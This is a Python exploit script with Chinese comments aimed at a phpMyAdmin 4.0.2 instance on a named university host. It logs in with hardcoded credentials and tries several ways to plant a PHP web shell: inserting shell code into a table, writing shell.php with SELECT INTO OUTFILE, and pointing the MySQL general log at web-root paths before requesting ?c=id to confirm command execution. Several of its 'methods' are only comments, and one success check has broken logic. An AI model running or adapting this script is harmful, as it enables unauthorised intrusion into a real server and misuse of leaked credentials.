#!/usr/bin/env python3
import requests
import re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# phpMyAdmin 4.0.2 RCE漏洞利用
url = "https://olympic.su.ac.th/phpmyadmin/"
session = requests.Session()
session.verify = False

# 登录
login_data = {"pma_username": "mysql", "pma_password": "Mu123.123.", "server": "1"}
resp = session.post(url + "index.php", data=login_data, allow_redirects=True)
token = re.search(r'token=([a-f0-9]+)', resp.text)
if not token:
    print("[-] 登录失败")
    exit(1)
token = token.group(1)

print(f"[+] Token: {token}")

# 方法1: 通过setup脚本RCE (CVE-2013-3238变种)
print("[*] 尝试setup.php RCE...")
setup_urls = [
    url + "setup/scripts/config.php",
    url + "setup/frames/servers.php",
]

# 方法2: 通过反序列化漏洞
print("[*] 尝试反序列化漏洞...")
# phpMyAdmin 4.0.2存在反序列化漏洞，可以通过特殊参数触发

# 方法3: 通过SQL注入到RCE
print("[*] 尝试SQL注入到文件写入...")
# 即使secure_file_priv限制，也可能通过其他方式绕过

# 创建恶意表，利用LOAD DATA INFILE
print("[*] 尝试LOAD DATA INFILE...")
sql = """
CREATE TABLE IF NOT EXISTS scmeeting.rce (
    cmd TEXT
);
INSERT INTO scmeeting.rce VALUES('<?php system($_GET["c"]); ?>');
"""
sql_data = {"sql_query": sql, "db": "scmeeting"}
session.post(url + "db_sql.php", params={"token": token, "db": "scmeeting"}, data=sql_data)

# 尝试通过phpMyAdmin导出功能
print("[*] 尝试导出功能RCE...")
export_url = url + f"db_export.php?db=scmeeting&token={token}"
# 导出时可能触发文件操作

# 方法4: 利用phpMyAdmin的临时文件功能
print("[*] 尝试临时文件利用...")
# phpMyAdmin可能创建临时文件，尝试控制文件名和内容

# 方法5: 通过用户变量写入
print("[*] 尝试用户变量写入...")
sql = "SET @shell = '<?php system($_GET[\"c\"]); ?>';"
sql_data = {"sql_query": sql, "db": "mysql"}
session.post(url + "server_sql.php", params={"token": token, "db": "mysql"}, data=sql_data)

# 尝试通过SELECT INTO DUMPFILE到已知可写位置
print("[*] 检查可写位置...")
writable_paths = [
    "/tmp",
    "/var/tmp", 
    "/dev/shm",
]

for wpath in writable_paths:
    sql = f"SELECT '<?php system($_GET[\"c\"]); ?>' INTO OUTFILE '{wpath}/shell.php';"
    sql_data = {"sql_query": sql, "db": "mysql"}
    resp = session.post(url + "server_sql.php", params={"token": token, "db": "mysql"}, data=sql_data)
    
    # 检查是否成功（即使无法HTTP访问，也确认写入能力）
    if "error" not in resp.text.lower() or "access denied" not in resp.text.lower():
        print(f"[*] 可能写入成功: {wpath}/shell.php")

# 方法6: 通过数据库日志文件
print("[*] 尝试数据库日志文件...")
# 设置日志文件到web可访问位置
log_paths = [
    "/var/www/html/banpot/scmeeting/log.php",
    "/var/www/html/log.php",
]

for log_path in log_paths:
    sql = f"SET GLOBAL general_log_file = '{log_path}';"
    sql_data = {"sql_query": sql, "db": "mysql"}
    session.post(url + "server_sql.php", params={"token": token, "db": "mysql"}, data=sql_data)
    
    sql = "SET GLOBAL general_log = 'ON';"
    sql_data = {"sql_query": sql, "db": "mysql"}
    session.post(url + "server_sql.php", params={"token": token, "db": "mysql"}, data=sql_data)
    
    sql = "SELECT '<?php system($_GET[\"c\"]); ?>';"
    sql_data = {"sql_query": sql, "db": "mysql"}
    session.post(url + "server_sql.php", params={"token": token, "db": "mysql"}, data=sql_data)
    
    sql = "SET GLOBAL general_log = 'OFF';"
    sql_data = {"sql_query": sql, "db": "mysql"}
    session.post(url + "server_sql.php", params={"token": token, "db": "mysql"}, data=sql_data)
    
    # 测试
    http_path = log_path.replace("/var/www/html", "")
    test_url = f"https://olympic.su.ac.th{http_path}?c=id"
    resp2 = requests.get(test_url, verify=False, timeout=5)
    if "uid=" in resp2.text:
        print(f"[+] Shell获取成功: {test_url}")
        exit(0)

print("[-] 所有方法尝试完毕")
